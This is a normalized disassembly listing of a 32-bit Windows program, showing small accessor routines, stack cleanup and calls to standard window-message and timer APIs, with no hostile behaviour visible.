mov ebx eax
mov edx esp
mov eax ebx
call sub_46b440
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46b424
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46b440
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46b6c0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b6cc
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b6d8
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b6e4
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b6f0
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b6fc
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b708
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4182a8
pop esi
pop ebx
retn
sub_46b71c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46b738
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4182a8
pop esi
pop ebx
retn
sub_46b74c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46b754
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4182a8
pop esi
pop ebx
retn
sub_46b768
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46b844
mov eax [ eax + 0x54 ]
call sub_41814c
retn
sub_46b850
mov eax [ eax + 0x54 ]
call sub_418444
retn
j_sub_4038f0#4
jmp sub_4038f0
sub_46bae7
jmp sub_4038f0
sub_46baee
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46bb3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46b93c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f40
pop esi
pop ebx
retn
sub_46bba8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4182a8
pop esi
pop ebx
retn
sub_46bbbc
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46bdc1
jmp sub_4038f0
sub_46bdc8
pop ebx
mov esp ebp
pop ebp
retn
sub_46bdd0
inc [ eax + 0x8c ]
retn
sub_46bdd8
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46bdf8
sub_46bdf8
xor edx edx
call sub_46c23c
retn
j_sub_4038f0#3
jmp sub_4038f0
sub_46c2b5
jmp sub_4038f0
sub_46c2c4
add eax 0x30
call sub_40cfec
retn
sub_46c308
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_46c359
jmp sub_40363c
sub_46c35e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46ca2d
jmp sub_4038f0
sub_46ca34
pop ebx
mov esp ebp
pop ebp
retn
sub_46cbbc
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46cbe8
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_46cc14
xor edx edx
call sub_46cb0c
retn
sub_46cc1c
mov dl 0x1
call sub_46cb0c
retn
sub_46cc90
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46cca8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46cd75
jmp sub_4038f0
sub_46cd7c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d4c6
jmp sub_40363c
sub_46dac4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_40363c#3
jmp sub_40363c
j_sub_40363c#2
jmp sub_40363c
sub_46dc3a
jmp sub_4038f0
sub_46dc41
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46dc48
call sub_40cb3c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46de41
jmp sub_4038f0
sub_46de48
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_4038f0#2
jmp sub_4038f0
sub_46df16
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e0ec
jmp sub_4038f0
sub_46e0f3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e154
jmp sub_4038f0
sub_46e15b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e164
call sub_46df2c
retn
j_sub_40363c
jmp sub_40363c
sub_46e3a8
jmp sub_4038f0
sub_46e3af
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e4dd
jmp sub_4038f0
sub_46e63c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46e93b
jmp sub_4038f0
sub_46e96a
jmp sub_4038f0
sub_46ea76
jmp sub_4038f0
sub_46ea7d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ee0e
jmp sub_4038f0
sub_46ee15
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ee58
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_46ef88
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46efd3
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46efe4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46eff4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
j_sub_4038f0
jmp sub_4038f0
sub_46f06e
pop ebp
retn
sub_46f070
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46f004
call sub_403cc0
call sub_46ef88
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_464bb8
call sub_417c10
sub_46f425
jmp sub_4038f0
sub_46f42c
pop ebp
retn
sub_46f6dd
jmp sub_4038f0
sub_46f6e4
pop esi
pop ebx
pop ebp
retn
sub_46f74b
jmp sub_4038f0
sub_46f752
pop ebp
retn
